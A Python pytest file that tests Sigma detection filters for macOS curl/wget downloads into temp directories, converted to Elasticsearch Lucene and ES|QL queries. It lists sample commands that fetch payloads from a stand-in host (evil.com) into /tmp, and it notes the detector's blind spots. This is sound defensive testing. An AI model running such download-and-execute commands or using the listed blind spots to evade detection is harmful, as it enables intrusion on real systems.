"""Test Sigma filter examples convert correctly."""
import pytest
import yaml
from pathlib import Path
from sigma.collection import SigmaCollection
from sigma.backends.elasticsearch import ESQLBackend, LuceneBackend
from sigma.pipelines.macos import macos_esf_ecs


def test_filters_apply():
    """Test that all example filters convert correctly with their target rules."""
    filters_dir = Path(__file__).parent.parent / "filters" / "examples"
    rules_dir = Path(__file__).parent.parent / "rules"

    # Find all filter files
    filter_files = list(filters_dir.glob("*.yml"))
    assert len(filter_files) > 0, "No filter files found"

    backend = LuceneBackend()

    for filter_file in filter_files:
        # Load the filter
        filter_collection = SigmaCollection.load_ruleset([str(filter_file)])

        # Filters are in collection.filters, not collection.rules
        assert len(filter_collection.filters) > 0, f"No filters found in {filter_file.name}"

        for sigma_filter in filter_collection.filters:
            # Get the rules referenced by this filter
            referenced_rule_ids = [ref.reference for ref in sigma_filter.filter.rules]

            for rule_id in referenced_rule_ids:
                # Find the rule file
                rule_file = None
                for yml_file in rules_dir.rglob("*.yml"):
                    content = yml_file.read_text()
                    if f"id: {rule_id}" in content:
                        rule_file = yml_file
                        break

                assert rule_file is not None, f"Could not find rule {rule_id} referenced by {filter_file.name}"

                # Load rule + filter together
                combined_collection = SigmaCollection.load_ruleset([str(rule_file), str(filter_file)])

                # Convert to Lucene query
                queries = backend.convert(combined_collection)

                # Verify the filter was applied
                query_str = "\n".join(queries) if isinstance(queries, list) else str(queries)

                # Check if this is a positive filter (attacker_forms_required) or negative filter
                if filter_file.name == "attacker_forms_required.yml":
                    # Positive filter: should AND attacker forms into the query, not negate
                    assert "AND NOT" not in query_str, \
                        f"Positive filter {filter_file.name} should not produce negation"
                    assert r"CommandLine:(*o\ \/tmp\/*" in query_str, \
                        f"Positive filter {filter_file.name} should contain attacker forms in query"
                else:
                    # Negative filter: should contain AND NOT
                    assert "AND NOT" in query_str or "AND (NOT" in query_str, \
                        f"Filter {filter_file.name} did not produce negation (AND NOT/AND (NOT) in query: {query_str}"


ATTACKER_FORMS = Path(__file__).parent.parent / "filters/examples/attacker_forms_required.yml"


@pytest.mark.parametrize("argv,hit", [
    # curl's own argv for the TUNING_GUIDE examples: the shell has already removed `&& bash ...`, `; python ...`, `| sh`
    ("curl -o /tmp/evil https://evil.com/evil", True),
    ("wget https://evil.com/script.py -O /tmp/x.py", True),
    ("/usr/bin/curl -fsSLo /tmp/x https://evil.com/x", True),  # combined flags
    ("curl -sko /private/tmp/.u http://evil.com/u", True),
    ("curl -o /var/tmp/a https://evil.com/a", True),
    ("wget -O /private/tmp/a https://evil.com/a", True),
    ("wget -o /tmp/wget.log https://example.com/x", True),  # false positive: wget's -o is its log file
    ("curl -fsSL https://evil.com/payload", False),  # `curl ... | sh`: no pipe in curl's argv (blind spot)
    ("curl -o /Users/u/Downloads/evil.sh https://evil.com/evil", False),  # two-step (blind spot)
    ("wget -P /tmp/ https://evil.com/x", False),  # blind spots: directory prefix, curl's output dir, attached path
    ("curl --output-dir /tmp -O https://evil.com/x", False),
    ("wget -O/tmp/x https://evil.com/x", False),
    ("curl -o /var/folders/x1/y2/T/x https://evil.com/x", False),  # $TMPDIR, expanded by the shell (blind spot)
    ("curl -o /Users/Shared/x https://evil.com/x", False),
    ("curl -O https://evil.com/x", False),  # after cd /tmp: no path in curl's argv (blind spot)
    ("curl -o x https://evil.com/x", False),  # relative, run from /tmp
    ("curl -o //tmp/x https://evil.com/x", False),
    ("curl -o /./tmp/x https://evil.com/x", False),
    ("curl -o /TMP/x https://evil.com/x", False),  # APFS writes /tmp/x; matched case-sensitively here, as ES|QL does
    ("/usr/bin/curl -fsSL https://updates.apple.com/x", False),
])
def test_attacker_forms_filter_on_real_argv(argv, hit):
    """The positive filter keeps a curl/wget event only if its argv (not the shell line around it) has a form.
    Matched case-sensitively, as ES|QL and plain keyword fields do; Sigma's own contains is case-insensitive."""
    forms = yaml.safe_load(ATTACKER_FORMS.read_text())["filter"]["selection_attacker_forms"]["CommandLine|contains"]
    assert not [f for f in forms if any(op in f for op in "|&;")], "shell operators never reach curl's argv"
    assert any(f in argv for f in forms) is hit


def test_attacker_forms_filter_in_esql_has_both_cases():
    """ES|QL's like is case-sensitive: wget's -O /tmp/ needs its own pattern there."""
    rule = Path(__file__).parent.parent / "rules/esf/macos_http_tools_with_protocol_indicators.yml"
    [query] = ESQLBackend(macos_esf_ecs()).convert(SigmaCollection.load_ruleset([str(rule), str(ATTACKER_FORMS)]))
    for d in ("/tmp/", "/private/tmp/", "/var/tmp/", "/dev/shm/"):
        assert f'process.command_line like "*o {d}*"' in query and f'process.command_line like "*O {d}*"' in query


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
